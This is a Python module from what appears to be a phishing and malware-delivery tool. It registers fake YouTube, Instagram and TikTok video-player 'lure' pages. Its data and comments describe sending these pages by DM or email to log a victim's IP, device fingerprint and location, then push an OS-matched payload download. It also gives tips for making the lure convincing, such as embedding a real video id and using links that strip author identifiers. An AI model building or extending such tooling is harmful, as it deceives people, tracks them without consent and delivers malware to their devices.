"""kits.py — the registry of lure page "kits" (the video-lure page skins).

`tracker.skin` was a free-form string. `env_tracker()` did `.strip().lower()`
and `tracker.py` rendered with

    if skin == "instagram": ...
    elif skin == "tiktok": ...
    else: <youtube>

so `tracker.skin=youube` did not fail: it fell through to the `else` branch
and rendered the YouTube chrome. The operator believed they had selected a
kit they had not, and nothing in the output said otherwise — the same failure
shape as any other value that is validated only when it is already wrong.

This module is the single list of what exists. It is deliberately small: three
GENERIC platform-page skins. It describes what `tracker.py` really renders, so
the answer to "which kit am I actually running?" is checkable instead of
inferred from a branch order.

It is a registry, not a renderer: nothing here emits markup.
"""

from __future__ import annotations

from dataclasses import dataclass
from typing import Dict, List, Optional, Tuple

#: The kit used when none is configured, and the fallback for an unknown one.
DEFAULT_KIT = "youtube"


@dataclass(frozen=True)
class KitSpec:
    """One lure page skin, as the operator should understand it."""

    id: str
    label: str
    channel: str
    #: a player page with no real video embedded is an immediate tell, so a
    #: video id (PHANTOM_TRACK_VIDEO_ID / craft reel) is part of the recipe
    needs_video_id: bool
    captures: str
    notes: str = ""


KITS: Tuple[KitSpec, ...] = (
    KitSpec(
        id="youtube",
        label="YouTube (shorts-style player)",
        channel="video share, email, DM",
        needs_video_id=True,
        captures="the play click (IP + device fingerprint + geo), then the "
                 "OS-matched payload download",
        notes="the DEFAULT kit. Renders the YouTube ▶ wordmark and the "
              "'Shorts' badge. Without a video id the player is a black "
              "placeholder — plausible for one second, and not more.",
    ),
    KitSpec(
        id="instagram",
        label="Instagram (reels-style player)",
        channel="DM, bio link, email",
        needs_video_id=True,
        captures="the play click (IP + device fingerprint + geo), then the "
                 "OS-matched payload download",
        notes="renders the italic Instagram wordmark and the 'Reels' badge. "
              "The share link is the one that strips the author identifier, "
              "so it is the skin to prefer inside a DM.",
    ),
    KitSpec(
        id="tiktok",
        label="TikTok (short-style player)",
        channel="DM, bio link",
        needs_video_id=True,
        captures="the play click (IP + device fingerprint + geo), then the "
                 "OS-matched payload download",
        notes="renders the TikTok wordmark with the creator handle as the "
              "badge. The handle is cosmetic: it is not a real account.",
    ),
)

BY_ID: Dict[str, KitSpec] = {kit.id: kit for kit in KITS}


def kit_ids() -> Tuple[str, ...]:
    return tuple(kit.id for kit in KITS)


def kit_by_id(kit: str) -> Optional[KitSpec]:
    return BY_ID.get((kit or "").strip().lower())


def resolve_kit(kit: str) -> Tuple[str, bool]:
    """Resolve a configured skin to a real kit id.

    Returns ``(effective_id, known)``. An empty value is simply "not
    configured" and resolves to the default silently; an UNKNOWN value also
    resolves to the default, but reports ``known=False`` so the caller can
    say so out loud. That distinction is the whole point: the operator who
    typed `youube` must be told that `youtube` is what ran.
    """
    requested = (kit or "").strip().lower()
    if not requested:
        return DEFAULT_KIT, True
    if requested in BY_ID:
        return requested, True
    return DEFAULT_KIT, False


def kit_rows() -> List[Tuple[str, str, str, str]]:
    """(id, label, channel, notes) per kit, for a table."""
    return [(kit.id, kit.label, kit.channel, kit.notes) for kit in KITS]
